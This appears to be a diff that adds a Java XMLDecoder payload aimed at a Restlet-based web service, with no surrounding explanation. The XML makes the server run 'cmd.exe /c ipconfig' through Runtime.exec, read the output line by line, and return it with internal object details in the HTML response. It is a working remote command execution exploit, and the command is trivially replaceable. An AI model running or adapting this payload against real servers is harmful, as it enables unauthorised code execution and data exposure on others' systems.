@@ -1,0 +1,96 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<java>	
+	<object id="runtime" class="java.lang.Runtime" method="getRuntime">	
+		<void id="process" method="exec">
+			<string>c:\\windows\\system32\cmd.exe /c ipconfig</string>			
+		</void>		
+	</object>	
+	
+	<object idref="process">
+		<void id="inputStream" method="getInputStream"/>
+	</object>	
+	<object id="inputStreamReader" class="java.io.InputStreamReader">
+		<object idref="inputStream"/>
+	</object>
+	<object id="bufferedReader" class="java.io.BufferedReader">
+		<object idref="inputStreamReader"/>
+	</object>
+				
+<!-- not working	 <array id="bytes" class="byte" length="250"/>
+	 
+	 <object idref="inputStream">	 	
+	 	<void method="read" >
+	 		<object idref="bytes" />
+	 		<int>0</int>
+	 		<int>250</int>
+	 	</void>
+	 	<void method="close" />
+	 </object>
+	 <object id="line3" class="java.lang.String">
+	 	<object idref="bytes"/>
+	 </object>
+-->	
+	<object idref="bufferedReader">
+		<void id="line1" method="readLine"/>
+		<void id="line2" method="readLine"/>
+		<void id="line3" method="readLine"/>		
+		<void id="line4" method="readLine"/>		
+		<void id="line5" method="readLine"/>		
+		<void id="line6" method="readLine"/>		
+		<void id="line7" method="readLine"/>		
+		<void id="line8" method="readLine"/>		
+		<void id="line9" method="readLine"/>
+		<void id="line10" method="readLine"/>
+		<void id="line11" method="readLine"/>
+		<void id="line12" method="readLine"/>
+		<void id="line13" method="readLine"/>		
+		<void id="line14" method="readLine"/>		
+		<void id="line15" method="readLine"/>		
+		<void id="line16" method="readLine"/>		
+		<void id="line17" method="readLine"/>		
+		<void id="line18" method="readLine"/>		
+		<void id="line19" method="readLine"/>
+	</object> 
+	 <string id="cmdOutput">
+		<object idref="line1"/>		
+		<object idref="line2"/>	
+		<object idref="line3"/>		
+		<object idref="line4"/>	
+		<object idref="line5"/>	
+		<object idref="line6"/>	
+		<object idref="line7"/>	
+		<object idref="line8"/>	
+		<object idref="line9"/>	
+		<object idref="line10"/>		
+		<object idref="line11"/>	
+		<object idref="line12"/>	
+		<object idref="line13"/>		
+		<object idref="line14"/>	
+		<object idref="line15"/>	
+		<object idref="line16"/>	
+		<object idref="line17"/>	
+		<object idref="line18"/>	
+		<object idref="line19"/>	
+	</string>
+	
+	<string id="response">		
+		&lt;h2/&gt;IPConfig Output:&lt;/h2/&gt;
+		&lt;pre/&gt;
+		<object idref="cmdOutput"/>		
+		&lt;/pre/&gt;
+		
+		&lt;h2/&gt;javaObjects:&lt;/h2/&gt;
+		java.lang.Runtime: <object idref="runtime"/>     	&lt;br/&gt;
+		java.lang.Process: <object idref="process"/>      	&lt;br/&gt;
+		java.io.InputStream: <object idref="inputStream"/>      &lt;br/&gt;
+		java.io.InputStreamReader: <object idref="inputStreamReader"/>      &lt;br/&gt;
+		java.io.BufferedReader: <object idref="bufferedReader"/>      &lt;br/&gt;
+
+	</string>
+	<object class="org.restlet.Response" method="getCurrent">	
+		<void method ="setEntity">
+			<object idref = "response"/>
+			<object class = "org.restlet.data.MediaType" field="TEXT_HTML"></object>
+		</void>
+	</object>		
+</java>	
